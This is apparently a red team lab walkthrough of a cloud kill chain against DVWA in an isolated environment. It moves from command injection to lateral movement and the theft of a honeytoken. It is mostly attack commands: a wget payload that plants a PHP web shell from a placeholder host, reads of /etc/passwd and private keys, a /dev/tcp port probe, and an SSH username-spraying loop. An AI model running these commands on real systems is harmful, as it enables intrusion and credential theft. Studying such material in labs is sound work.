# Red Team Walkthrough: Cloud Lateral Movement

**Objective:** To demonstrate a complete Cyber Kill Chain within an isolated cloud environment, starting from initial access in the DMZ to data exfiltration from an internal, firewalled server.

---

## Phase 1: Initial Access
The attack was initiated by identifying a vulnerable web application exposed in the DMZ.
* The application's (DVWA) security level was verified to be "Low".
  
  <img width="676" height="400" alt="image" src="https://github.com/user-attachments/assets/65be998c-32d4-40e4-a8ce-3e728fd367dc" />
  

* A Command Injection vulnerability was exploited to test arbitrary code execution capabilities and plant a persistent PHP Web Shell.
  **Exploit Payload used in DVWA:**
  ```bash
  127.0.0.1; wget http://[SOURCE_IP]/webshell.php -O /var/www/html/hackable/uploads/webshell.php
  ```
  
  <img width="674" height="279" alt="image" src="https://github.com/user-attachments/assets/f09565d5-1123-4fba-ad13-64ed0457da0a" />


---

## Phase 2: Local Reconnaissance
Upon establishing a shell session, the attacker enumerated the local environment and host configuration.
* Verification of web server privileges:
  ```bash
  whoami
  ```
  
  <img width="874" height="162" alt="image" src="https://github.com/user-attachments/assets/820b22c8-12e6-4c21-90f2-15882c52474b" />


* Dumping local system accounts for potential dictionary attacks:
  ```bash
  cat /etc/passwd
  ```
  
  <img width="872" height="573" alt="image" src="https://github.com/user-attachments/assets/08a65bef-7166-4e71-ab6f-5156801b2d9c" />


* Enumeration of network interfaces and the routing table:
  ```bash
  ip a
  ip route
  ```
  
  <img width="872" height="311" alt="image" src="https://github.com/user-attachments/assets/0a51bff7-9a41-41a4-ad92-161441671ca6" />

  <img width="875" height="185" alt="image" src="https://github.com/user-attachments/assets/1d2612da-fa72-4abc-9bd7-fc6eaa04f810" />


* Execution environment check:
  ```bash
  ls -la /.dockerenv
  ```

  <img width="872" height="166" alt="image" src="https://github.com/user-attachments/assets/83c8a606-5488-43ea-bcf9-fd84ef2bc929" />


---

## Phase 3: Network Reconnaissance
Since the Bastion host operates within a cloud VPC, a network sweep was conducted to identify hidden assets in the internal subnet (`10.0.2.0/24`).
* A Bash-based Ping Sweep loop identified an active machine at `10.0.2.2`.
  ```bash
  bash -c 'for i in {1..10}; do ping -c 1 -W 1 10.0.2.$i | grep "bytes from"; done'
  ```

  <img width="1216" height="155" alt="image" src="https://github.com/user-attachments/assets/0c1ab077-6eca-4158-a0da-604ef5375025" />

  
* Connection stability check with the target:
  ```bash
  ping -c 3 10.0.2.2
  ```
  
  <img width="874" height="297" alt="image" src="https://github.com/user-attachments/assets/b7d4aca1-2afb-414f-9b37-59a271576764" />


* Port sweep confirmed that port 22 (SSH) was open on the target machine:
  ```bash
  bash -c 'timeout 2 bash -c "</dev/tcp/10.0.2.2/22" 2>/dev/null %26%26 echo "OPEN - SSH FOUND" || echo "CLOSED"'
  ```
  
  <img width="1515" height="151" alt="image" src="https://github.com/user-attachments/assets/0ede1b84-f5bc-4fe9-b2d3-c0c32e31fa80" />


---

## Phase 4: Credential Harvesting
The attacker scavenged the web server directories for forgotten secrets.
* A recursive search revealed the header of an OpenSSH private key:
  ```bash
  grep -rnw '/var/www/html/' -e "BEGIN OPENSSH PRIVATE KEY" 2>/dev/null
  ```
  
  <img width="1229" height="158" alt="image" src="https://github.com/user-attachments/assets/1ba27c38-e304-41a6-8371-55798be34201" />


* Reading and verifying the contents of the compromised `id_ed25519` key:
  ```bash
  cat /var/www/html/hackable/uploads/.ssh/id_ed25519
  ssh-keygen -y -f /var/www/html/hackable/uploads/.ssh/id_ed25519 2>&1
  ```

  <img width="1076" height="289" alt="image" src="https://github.com/user-attachments/assets/b6b054d7-3d40-497f-9aa5-e688808a483c" />

  <img width="1232" height="171" alt="image" src="https://github.com/user-attachments/assets/67ec81f3-1a04-492f-bd22-7fd920bb4988" />


---

## Phase 5: Lateral Movement
Armed with the private key, the attacker performed a Username Spraying attack against the internal target (`10.0.2.2`).
* A script tested common administrative usernames and confirmed `admin` as valid:
  ```bash
  bash -c 'for user in root devops sysadmin admin ubuntu debian; do ssh -q -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /var/www/html/hackable/uploads/.ssh/id_ed25519 $user@10.0.2.2 "echo [ ] znaleziono prawidlowe konto: $user" 2>/dev/null; done'
  ```
  
  <img width="1604" height="158" alt="image" src="https://github.com/user-attachments/assets/6964a0ad-ec17-4241-8f93-02717c2c2b81" />


* The attacker authenticated to the internal server and listed the home directory:
  ```bash
  ssh -q -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /var/www/html/hackable/uploads/.ssh/id_ed25519 admin@10.0.2.2 "ls -la /home/admin/" 2>/dev/null
  ```
  
  <img width="1594" height="315" alt="image" src="https://github.com/user-attachments/assets/fb4dd102-d0b9-452d-bf5e-a001c9ae1a84" />


---

## Phase 6: Data Exfiltration
The final objective was to locate and extract highly sensitive information.
* Inspection of the `backup` directory:
  ```bash
  ssh -o BatchMode=yes -i /var/www/html/hackable/uploads/.ssh/id_ed25519 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@10.0.2.2 "ls -l /home/admin/backup/"
  ```
  <img width="1594" height="179" alt="image" src="https://github.com/user-attachments/assets/fadf5ddd-798c-4289-9497-a01f24be5c04" />


* Exfiltration of the Honeytoken:
  ```bash
  ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /var/www/html/hackable/uploads/.ssh/id_ed25519 admin@10.0.2.2 "cat /home/admin/backup/hasla.txt" 2>/dev/null
  ```
  <img width="1592" height="181" alt="image" src="https://github.com/user-attachments/assets/1e6bed38-9bb4-414b-aa24-31b828bf1ec7" />
